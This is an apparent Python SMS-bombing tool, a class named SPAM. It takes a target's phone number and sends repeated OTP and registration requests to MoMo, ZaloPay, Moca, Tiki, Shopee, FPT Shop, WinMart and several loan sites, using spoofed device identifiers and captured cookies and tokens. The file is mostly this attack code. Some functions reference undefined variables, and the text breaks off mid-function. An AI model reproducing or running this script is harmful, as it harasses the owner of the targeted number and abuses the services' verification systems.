import os
import threading
import requests
from pystyle import *
import time
import sys
import uuid
import random
import socket
import requests


class SPAM:
    def __init__(self):
        self.blue = Col.light_blue
        self.lblue = Colors.StaticMIX((Col.light_blue, Col.white, Col.white))
        self.red = Colors.StaticMIX((Col.red, Col.white, Col.white))
        self.appVer = 40012
        self.appCode = '4.0.1'
        self.time_zone = int(round(time.time() * 1000))
        self.imei = uuid.uuid4()
        self.token = f'{self.random_string(22)}:{self.random_string(53)}-{self.random_string(86)}'
        self.headers = {
            'Host': 'api.momo.vn',
            'msgtype': 'SEND_OTP_MSG',
            'Accept': 'application/json',
            'agent_id': 'undefined',
            'app_version': '31161',
            'Authorization': 'Bearer undefined',
            'user_phone': 'undefined',
            'app_code': '3.1.16',
            'Accept-Language': 'vi-vn',
            'device_os': 'IOS',
            'lang': 'vi',
            'User-Agent': 'MoMoPlatform-Release/31161 CFNetwork/1240.0.4 Darwin/20.5.0',
        }
        self.ua = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
        }

    def format_print(self, symbol, text):
        return f"""                      {Col.Symbol(symbol, self.lblue, self.blue)} {self.lblue}{text}{Col.reset}"""

    def format_input(self, symbol, text):
        return f"""                      {Col.Symbol(symbol, self.red, self.blue)} {self.red}{text}{Col.reset}"""

    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        title = '\n\n\n-------------'

        banner = '''\n
\033[0m───────────────────────────────────────────────────────────
\033[1;32m ██╗  ██╗██╗███████╗██╗   ██ ████████╗ █████╗  █████╗ ██╗
\033[1;31m ██║  ██║██║██╔════╝██║   ██ ╚══██╔══╝██╔══██╗██╔══██╗██║
\033[1;32m ███████║██║█████╗  ██║   ██║   ██║   ██║  ██║██║  ██║██║
\033[1;31m ██╔══██║██║██╔══╝  ██║   ██║   ██║   ██║  ██║██║  ██║██║
\033[1;32m ██║  ██║██║███████╗╚██████╔╝   ██║    █████╔╝╚█████╔╝███████╗
\033[1;31m ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝
\033[0m───────────────────────────────────────────────────────────

\033[1;39m_ _ _ _ _ _ _ _ _ _ _ _* SPAM SMS *_ _ _ _ _ _ _ _ _ _ _ _ _
                               \n\n'''
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_gray)), Center.XCenter(
            title)) + Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.light_blue)), Center.XCenter(banner)))

    def random_string(self, length):
        number = '0123456789'
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
        id = ''
        for i in range(0, length, 2):
            id += random.choice(number)
            id += random.choice(alpha)
        return id

    def checkdvc(self):
        while True:
            json_data = {
                'user': self.sdt,
                'msgType': 'CHECK_USER_BE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.sdt,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }

            response = requests.post(
                'https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG', headers=self.headers, json=json_data)
            time.sleep(500)

    def send_otp(self):
        json_data = {
            'user': self.sdt,
            'msgType': 'SEND_OTP_MSG',
            'momoMsg': {
                '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                'number': self.sdt,
                'imei': str(self.imei),
                'cname': 'Vietnam',
                'ccode': '084',
                'device': 'iPhone',
                'firmware': '14.6',
                'hardware': 'iPhone',
                'manufacture': 'Apple',
                'csp': 'Carrier',
                'icc': '',
                'mcc': '0',
                'mnc': '0',
                'device_os': 'ios',
                'secure_id': '',
            },
            'extra': {
                'action': 'SEND',
                'rkey': self.random_string(20),
                'IDFA': '',
                'SIMULATOR': False,
                'TOKEN': self.token,
                'ONESIGNAL_TOKEN': self.token,
                'SECUREID': '',
                'MODELID': str(self.imei),
                'DEVICE_TOKEN': '',
                'isVoice': False,
                'REQUIRE_HASH_STRING_OTP': True,
            },
            'appVer': self.appVer,
            'appCode': self.appCode,
            'lang': 'vi',
            'deviceOS': 'ios',
            'channel': 'APP',
            'buildNumber': 0,
            'appId': 'vn.momo.platform',
            'cmdId': f'{self.time_zone}000000',
            'time': self.time_zone,
        }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG',
                                     headers=self.headers, json=json_data).json()['errorDesc']
            if 'Thành công' in response:
                print(self.format_print("*", f"MOMO: {response}"))
            else:
                print(self.format_print("*", f"MOMO: "+response))
        except:
            print(self.format_print("*", f"MOMO: BAD REQUESTS LIMIT!"))

    def send_code(self):
        json_data = {
            'user': self.sdt,
            'msgType': 'REG_DEVICE_MSG',
            'momoMsg': {
                '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                'number': self.sdt,
                'imei': str(self.imei),
                'cname': 'Vietnam',
                'ccode': '084',
                'device': 'iPhone',
                'firmware': '14.6',
                'hardware': 'iPhone',
                'manufacture': 'Apple',
                'csp': 'Carrier',
                'icc': '',
                'mcc': '0',
                'mnc': '0',
                'device_os': 'ios',
                'secure_id': '',
            },
            'extra': {
                'ohash': 'a55b1a625c9e36b3e2a001db13f18ad3afd6e0a19dcae6066566ba1f5f14e3d6',
                'IDFA': '',
                'SIMULATOR': False,
                'TOKEN': self.token,
                'ONESIGNAL_TOKEN': self.token,
                'SECUREID': '',
                'MODELID': str(self.imei),
                'DEVICE_TOKEN': '',
            },
            'appVer': self.appVer,
            'appCode': self.appCode,
            'lang': 'vi',
            'deviceOS': 'ios',
            'channel': 'APP',
            'buildNumber': 0,
            'appId': 'vn.momo.platform',
            'cmdId': f'{self.time_zone}000000',
            'time': self.time_zone,
        }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/REG_DEVICE_MSG',
                                     headers=self.headers, json=json_data).json()['errorDesc']
            print(self.format_print("*", f"MOMO: "+response))
        except:
            print(self.format_print("*", f"MOMO: BAD REQUESTS LIMIT!"))

    def Gbay(self):
        json_data = {
            'phone_number': self.sdt,
            'hash': self.random_string(40),
        }
        try:
            response = requests.post(
                'https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()['meta']['msg']
            print(self.format_print("*", f"GBAY: SUCCESS!"))
        except:
            print(self.format_print("*", f"GBAY: ERROR!"))

    def moca(self):
        headers = {
            'Host': 'moca.vn',
            'Accept': '*/*',
            'Device-Token': str(self.imei),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'vi',
            'X-Moca-Api-Version': '2',
            'platform': 'P_IOS-2.10.42',
            'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',
        }
        params = {
            'phoneNumber': self.sdt,
        }
        try:
            home = requests.get(
                'https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
            token = home['data']['registrationId']
            response = requests.post(
                f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
            print(self.format_print("*", f"MOCA: SUCCESS!"))
        except:
            print(self.format_print("*", f"MOCA: ERROR!"))

    def zalopay(self):
        try:
            headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
            params = {
                'phone_number': self.sdt,
            }

            token = requests.get('https://api.zalopay.vn/v2/account/phone/status',
                                 params=params, headers=headers).json()['data']['send_otp_token']
            json_data = {
                'phone_number': self.sdt,
                'send_otp_token': token,
            }

            response = requests.post(
                'https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
            print(self.format_print("*", f"ZALOPAY: SUCCESS!"))
        except:
            print(self.format_print("*", f"ZALOPAY: ERROR!"))

    def tiki(self):
        try:

            cookies = {
                '_trackity': '00f86044-660c-d2cf-ce4b-4ed902146904',
                'TOKENS': '{%22access_token%22:%22V7y1GAQxc04TUjghrY6zwJqRElmvkKna%22}',
                'delivery_zone': 'Vk4wMzQwMjQwMTM=',
                'tiki_client_id': '',
                '_ga': 'GA1.2.2075692213.1686148564',
                '_gid': 'GA1.2.428817867.1686148564',
                '_gat': '1',
            }

            headers = {
                'authority': 'tiki.vn',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                'content-type': 'application/json;charset=UTF-8',
                # 'cookie': '_trackity=00f86044-660c-d2cf-ce4b-4ed902146904; TOKENS={%22access_token%22:%22V7y1GAQxc04TUjghrY6zwJqRElmvkKna%22}; delivery_zone=Vk4wMzQwMjQwMTM=; tiki_client_id=; _ga=GA1.2.2075692213.1686148564; _gid=GA1.2.428817867.1686148564; _gat=1',
                'origin': 'https://tiki.vn',
                'referer': 'https://tiki.vn/',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'x-guest-token': 'V7y1GAQxc04TUjghrY6zwJqRElmvkKna',
            }

            json_data = {
                'phone': self.sdt,
            }

            response = requests.post(
                'https://tiki.vn/api/v2/customers/exist', cookies=cookies, headers=headers, json=json_data)

            print(self.format_print("*", f"TIKI: SUCCESS!"))
        except:
            print(self.format_print("*", f"TIKI: ERROR!"))

    def meta_vn(self):
        try:
            params = {
                'api_mode': '1',
            }

            json_data = {
                'api_args': {
                    'lgUser': self.sdt,
                    'act': 'send',
                    'type': 'phone',
                },
                'api_method': 'CheckExist',
            }

            response_meta_vn = requests.post(
                'https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=self.ua, json=json_data).text
            print(self.format_print("*", f"METAVN: SUCCESS!"))
        except:
            print(self.format_print("*", f"METAVN: ERROR!"))

    def vntrip(self):
        try:
            json_data = {
                'feature': 'forgot_password',
                'phone': '+84'+self.sdt[1:11],
                'token': '03AL8dmw8iJ8qef2KndGqNzdsRlUxypp0Z0HVSLp4XUfwAx170ILuaCDpq4Gc_R6s17mhzxsnGOwXu8uTReiPY-dIxy5Dbkk7ZCbSeE-E9lA0n4YbFZhnRLvInE7Wv5KsQ-7YnfrOBUgO7ktbv1NlEd3yN1mBh9ePJvbApFKsloYqWE1XWQ2UjUKO-e4BH3dad1GZlHumlL9UjbthGVucxYxZ9QTJbwF5AwU_k9cNmupecdOFJXa44HK63pzxozgcXWWd8r_ggCjxyRpqhNMTS6qbQ7T_HR_TzxndB0MIWTyeG8H6gOkQ8l2qVlC_dlqEPCuxbwpiE6WAyG7vdXewN7_Z6Z_d7VXH1qHEl-CPlmAwLQq6z-c66R3GhcOVtskVnreKgFtSXP5kaZFUB5ktoJHIIbmuqxT9xmq2IgxpiaOhARlRBG7xEb0zHfrO1Xobb9jqnjbNBW_zoJeUAryHH97b1YLwCHqNHeBERhO-RY3coTzcMGgPIJFYMVP8u9JdRbew9-1vRcJqSKak6UWglFkKwszaXdsJU7MVYM1ykOiSNeSjxwiDd8AEvZHiF5G92L3BG2G_WRSHW883RQvchkwrZAH6-iJ8v-wC33zW-Il2Vul3DO4G05BxrlxC1XgBHAfWQ_JmRn0Pn',
            }

            response = requests.post(
                'https://micro-services.vntrip.vn/core-user-service/verification/request/phone',
                headers=headers,
                json=json_data,
            )

            print(self.format_print("*", f"VNTRIP: SUCCESS!"))
        except:
            print(self.format_print("*", f"VNTRIP: ERROR!"))

    def shopee(self):
        try:
            json_data = {
                'operation': 7,
                'phone': '+84'+self.sdt[1:11],
                'supported_channels': [
                    1,
                    2,
                    3,
                    5,
                ],
                'support_session': False,
            }

            response = requests.post(
                'https://shopee.vn/api/v4/otp/get_settings_v2', cookies=cookies, headers=headers, json=json_data)
            print(self.format_print("*", f"SHOPEE: SUCCESS!"))
        except:
            print(self.format_print("*", f"SHOPEE: ERROR!"))

    def vayno(self):
        try:

            cookies = {
                'OnCredit_id': '647034220f5d78.54070646',
                'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '4V9Hc1K7VPUyJUUaE58rAcPKkDX7llJKRMixBQZnbAU=',
                'SN5c8116d5e6183': 'sb6ohfteiumorm6pp4181flnr3',
                'universalUtm': 'a%3A7%3A%7Bs%3A10%3A%22utm_source%22%3Bs%3A6%3A%22coccoc%22%3Bs%3A10%3A%22utm_medium%22%3Bs%3A3%3A%22CPC%22%3Bs%3A12%3A%22utm_campaign%22%3Bs%3A23%3A%22Oncredit%7CBrand+%28Search%29%22%3Bs%3A8%3A%22utm_term%22%3Bs%3A9%3A%22on+credit%22%3Bs%3A11%3A%22utm_content%22%3Bs%3A8%3A%2237867550%22%3Bs%3A7%3A%22clickId%22%3Bs%3A1%3A%22%2A%22%3Bs%3A18%3A%22cookieTimeCreation%22%3Bi%3A1685086477%3B%7D',
            }

            headers = {
                'authority': 'oncredit.vn',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'OnCredit_id=647034220f5d78.54070646; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=4V9Hc1K7VPUyJUUaE58rAcPKkDX7llJKRMixBQZnbAU=; SN5c8116d5e6183=sb6ohfteiumorm6pp4181flnr3; universalUtm=a%3A7%3A%7Bs%3A10%3A%22utm_source%22%3Bs%3A6%3A%22coccoc%22%3Bs%3A10%3A%22utm_medium%22%3Bs%3A3%3A%22CPC%22%3Bs%3A12%3A%22utm_campaign%22%3Bs%3A23%3A%22Oncredit%7CBrand+%28Search%29%22%3Bs%3A8%3A%22utm_term%22%3Bs%3A9%3A%22on+credit%22%3Bs%3A11%3A%22utm_content%22%3Bs%3A8%3A%2237867550%22%3Bs%3A7%3A%22clickId%22%3Bs%3A1%3A%22%2A%22%3Bs%3A18%3A%22cookieTimeCreation%22%3Bi%3A1685086477%3B%7D',
                'origin': 'https://oncredit.vn',
                'referer': 'https://oncredit.vn/registration',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'data[typeData]': 'sendCodeReg',
                'data[phone]': self.sdt,
                'data[email]': 'hahaha@gmail.com',
                'data[captcha1]': '1',
                'data[lang]': 'vi',
                'CSRFName': 'CSRFGuard_ajax',
                'CSRFToken': 'abhEGyayyHTGhKyh24iF7k8rhk2R5YnNskYs8R2h6fYHQSS77i7HGDFSf6TnEDST',
            }

            response = requests.post(
                'https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)

            print(self.format_print("*", f"vayno: SUCCESS!"))
        except:
            print(self.format_print("*", f"vayno: ERROR!"))

    def winmart(self):
        try:
            response = requests.get(
                f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={self.sdt}")
            print("winmart thanh cong")
        except:
            print("winmart loi")

    def fptshop(self):
        try:
            cookies = {
                '_gcl_au': '1.1.703631497.1686140476',
                '_ga': 'GA1.3.271709154.1686140475',
                '_gid': 'GA1.3.791649825.1686140476',
                '_gat': '1',
                'fpt_uuid': '%22db878fef-4d1a-43e9-ba85-f2e1f0fd420f%22',
                'ajs_group_id': 'null',
                'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '4ee24579-5761-4d9e-8786-91d8020b97df',
                'vMobile': '1',
                '_tt_enable_cookie': '1',
                '_ttp': 'hOpcmWUznBtM6zFw9nlg3pfrFZe',
                '_fbp': 'fb.2.1686140478912.1744066820',
                '__zi': '2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpesmSKY7tJfwJH0HMFSzIdxzO56i5orgpfq0SVpJW.1',
                '_hjSessionUser_731679': 'eyJpZCI6ImE2MWQ4YWY5LTdmMmItNWYzMi1iYzdmLWJhMTQyZmI2MTgyNCIsImNyZWF0ZWQiOjE2ODYxNDA0ODA5MDgsImV4aXN0aW5nIjpmYWxzZX0=',
                '_hjFirstSeen': '1',
                '_hjIncludedInSessionSample_731679': '0',
                '_hjSession_731679': 'eyJpZCI6IjMxNGZkNzAwLTEwNWQtNDk1OS1hODc3LTg4YmJmMTgwNjYyOSIsImNyZWF0ZWQiOjE2ODYxNDA0ODA5MzMsImluU2FtcGxlIjpmYWxzZX0=',
                '_hjAbsoluteSessionInProgress': '0',
                '__cf_bm': 'A8899Ea1MjLlHrARy.yl7Vlz79n7OvqzOcYuB0fFU.k-1686140459-0-AZlaIVqei0rGUN1iTIOEupAbY+U6ODFyqE1PoLZbW+88eFG0dEPA59st7UytRnpTPw==',
                '_ga_ZR815NQ85K': 'GS1.1.1686140475.1.0.1686140482.53.0.0',
                'sessionID': '5838dfee-b408-c87f-464f-4a70fd29a052',
            }

            headers = {
                'Accept': '*/*',
                'Accept-Language': 'vi',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'Cookie': '_gcl_au=1.1.703631497.1686140476; _ga=GA1.3.271709154.1686140475; _gid=GA1.3.791649825.1686140476; _gat=1; fpt_uuid=%22db878fef-4d1a-43e9-ba85-f2e1f0fd420f%22; ajs_group_id=null; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=4ee24579-5761-4d9e-8786-91d8020b97df; vMobile=1; _tt_enable_cookie=1; _ttp=hOpcmWUznBtM6zFw9nlg3pfrFZe; _fbp=fb.2.1686140478912.1744066820; __zi=2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpesmSKY7tJfwJH0HMFSzIdxzO56i5orgpfq0SVpJW.1; _hjSessionUser_731679=eyJpZCI6ImE2MWQ4YWY5LTdmMmItNWYzMi1iYzdmLWJhMTQyZmI2MTgyNCIsImNyZWF0ZWQiOjE2ODYxNDA0ODA5MDgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6IjMxNGZkNzAwLTEwNWQtNDk1OS1hODc3LTg4YmJmMTgwNjYyOSIsImNyZWF0ZWQiOjE2ODYxNDA0ODA5MzMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __cf_bm=A8899Ea1MjLlHrARy.yl7Vlz79n7OvqzOcYuB0fFU.k-1686140459-0-AZlaIVqei0rGUN1iTIOEupAbY+U6ODFyqE1PoLZbW+88eFG0dEPA59st7UytRnpTPw==; _ga_ZR815NQ85K=GS1.1.1686140475.1.0.1686140482.53.0.0; sessionID=5838dfee-b408-c87f-464f-4a70fd29a052',
                'Origin': 'https://fptshop.com.vn',
                'Referer': 'https://fptshop.com.vn/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'phone': self.sdt,
                'typeReset': '0',
            }

            response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification',
                                     cookies=cookies, headers=headers, data=data)
            print(self.format_print("*", f"fptshop: SUCCESS!"))
        except:
            print(self.format_print("*", f"fptshop: ERROR!"))

    def est(self):
        try:
            headers = {
                'Host: app.tienoi.com.vn',
                'accept: application/json, text/plain, */*',
                'user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
                'content-type: application/json',
                'origin: https://app.tienoi.com.vn',
                'referer: https://app.tienoi.com.vn/auth/registration?need=2000000&days=14',
            }

            data = {
                'mobilePhone': self.sdt,
                'password': 'A123456789a',
                'passwordConfirmation': 'A123456789a',
                'isVoiceSms': True,
            }

            response = requests.post(
                'https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode', headers=headers, data=data)
            print(self.format_print("*", f"tienoi: SUCCESS!"))
        except:
            print(self.format_print("*", f"tienoi: ERROR!"))

    def thantaioi(self):
        try:
            cookies = {
                'cf_clearance': 'ajl0DJO0c7AErX4Yvn7iPVdYTPPw3WdqJ5lOpaayPz0-1686143064-0-160',
                '_fw_crm_v': 'd5654e80-edb1-4686-f28d-57ede7b35977',
            }

            headers = {
                'authority': 'api.thantaioi.vn',
                'accept': '*/*',
                'accept-language': 'vi',
                'content-type': 'application/json',
                # 'cookie': 'cf_clearance=ajl0DJO0c7AErX4Yvn7iPVdYTPPw3WdqJ5lOpaayPz0-1686143064-0-160; _fw_crm_v=d5654e80-edb1-4686-f28d-57ede7b35977',
                'origin': 'https://thantaioi.vn',
                'referer': 'https://thantaioi.vn/user/login',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            }

            json_data = {
                'phone': ''+self.sdt[1:11],
            }

            response = requests.post(
                'https://api.thantaioi.vn/api/user/send-one-time-password', cookies=cookies, headers=headers, json=json_data,)
            print(self.format_print("*", f"thantaioi: SUCCESS!"))
        except:
            print(self.format_print("*", f"thantaioi: ERROR!"))

    def caydenthan(self):
        try:
            cookies = {
                '_fw_crm_v': 'd481c45b-3b08-48ed-92a8-a349c165b8d8',
            }

            headers = {
                'authority': 'api.caydenthan.vn',
                'accept': '*/*',
                'accept-language': 'vi',
                'content-type': 'application/json',
                # 'cookie': '_fw_crm_v=d481c45b-3b08-48ed-92a8-a349c165b8d8',
                'origin': 'https://caydenthan.vn',
                'referer': 'https://caydenthan.vn/user/login',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            }

            json_data = {
                'phone': '84'+self.sdt[1:11],
            }

            response = requests.post(
                'https://api.caydenthan.vn/api/user/send-one-time-password', cookies=cookies, headers=headers, json=json_data,)
            print(self.format_print("*", f"cay den than: SUCCESS!"))
        except:
            print(self.format_print("*", f"cay den than: ERROR!"))

    def dongplus(self):
        try:
            headers = {
                'authority': 'api.dongplus.vn',
                'accept': '*/*',
                'accept-language': 'vi',
                'content-type': 'application/json',
                'origin': 'https://dongplus.vn',
                'referer': 'https://dongplus.vn/user/registration/reg1',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            }

            json_data = {
                'full_name': 'nguyn van a',
                'first_name': 'a',
                'last_name': 'nguyn',
                'middle_name': 'van',
                'mobile_phone': '84'+self.sdt[1:11],
                'target_url': 'https://dongplus.vn/?utm_source=hyperlead&utm_campaign=cps&click_id=647f34c57eb9ea0001fd19e4&md=_05be50vdanX7QmsEHAREOlmIPzcXUNlMehyz-uSq5ryhHbx%2AzZG6Fkr6H2UOKiRrOVp3mRZk98jiieCOmcnaLThHLppEFJ-GHtcPtPL15Zce5-3rwZXFNfjbDqZRyZc2rNRg.',
            }

            response = requests.post(
                'https://api.dongplus.vn/api/user', headers=headers, json=json_data)
            print(self.format_print("*", f"dongplus: SUCCESS!"))
        except:
            print(self.format_print("*", f"dongplus: ERROR!"))

    def moneyveo(self):
        try:
            cookies = {
                'CaptchaCookieKey': '0',
                'ASP.NET_SessionId': '015plfrtwodrpoah3khnsqtr',
                'language': 'vi',
                'RequestData': '31501677-f480-4bcb-ba82-7845bb00a104',
                'LeadPartner31B92E50BCF7EFC6A1': 'lgid=13&lpid=utm_medium%3dCPS%26tracking_id%3d5nYoI1w9oV9Qio7826EHQJw5WYzArQTSo0PMWOgWUei37URS%26utm_source%3daccesstrade%26utm_term%3d107536%26atnct1%3d0e095e054ee94774d6a496099eb1cf6a%26atnct2%3d5nYoI1w9oV9Qio7826EHQJw5WYzArQTSo0PMWOgWUei37URS%26atnct3%3doF9Uy00085c002az4%26utm_content%3d43454024%26md%3d_05be50vdanX7cmsEHDREOluJlDzJK8Ma32DakoSq5ryhHbx*zZG6Fnh91bw5iqlrA61BVBXAMtoKtpBIBRHqkllsKTJhSokG6D4bpm5oBxUWdFv9m46oDPSwPjGdOFD2MLFFo',
                'ET31B92E50BCF7EFC6A1': '-8585128692770970280',
                '__sbref': 'xuhfrhdfpccttpywqlsjmvekfhoptfnxcliuhvbq',
                'UserMachineId_png': '47b03718-646e-42a5-8b42-2a24d33c98ce',
                'UserMachineId_etag': '47b03718-646e-42a5-8b42-2a24d33c98ce',
                'UserMachineId_cache': '47b03718-646e-42a5-8b42-2a24d33c98ce',
                'UserMachineId': '47b03718-646e-42a5-8b42-2a24d33c98ce',
            }

            headers = {
                'authority': 'moneyveo.vn',
                'accept': '*/*',
                'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'CaptchaCookieKey=0; ASP.NET_SessionId=015plfrtwodrpoah3khnsqtr; language=vi; RequestData=31501677-f480-4bcb-ba82-7845bb00a104; LeadPartner31B92E50BCF7EFC6A1=lgid=13&lpid=utm_medium%3dCPS%26tracking_id%3d5nYoI1w9oV9Qio7826EHQJw5WYzArQTSo0PMWOgWUei37URS%26utm_source%3daccesstrade%26utm_term%3d107536%26atnct1%3d0e095e054ee94774d6a496099eb1cf6a%26atnct2%3d5nYoI1w9oV9Qio7826EHQJw5WYzArQTSo0PMWOgWUei37URS%26atnct3%3doF9Uy00085c002az4%26utm_content%3d43454024%26md%3d_05be50vdanX7cmsEHDREOluJlDzJK8Ma32DakoSq5ryhHbx*zZG6Fnh91bw5iqlrA61BVBXAMtoKtpBIBRHqkllsKTJhSokG6D4bpm5oBxUWdFv9m46oDPSwPjGdOFD2MLFFo; ET31B92E50BCF7EFC6A1=-8585128692770970280; __sbref=xuhfrhdfpccttpywqlsjmvekfhoptfnxcliuhvbq; UserMachineId_png=47b03718-646e-42a5-8b42-2a24d33c98ce; UserMachineId_etag=47b03718-646e-42a5-8b42-2a24d33c98ce; UserMachineId_cache=47b03718-646e-42a5-8b42-2a24d33c98ce; UserMachineId=47b03718-646e-42a5-8b42-2a24d33c98ce',
                'origin': 'https://moneyveo.vn',
                'referer': 'https://moneyveo.vn/vi/registernew/',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-d123d3fb2c75d6327064ac99ac6bd3ed-af07b1ba3f3b9350-00',
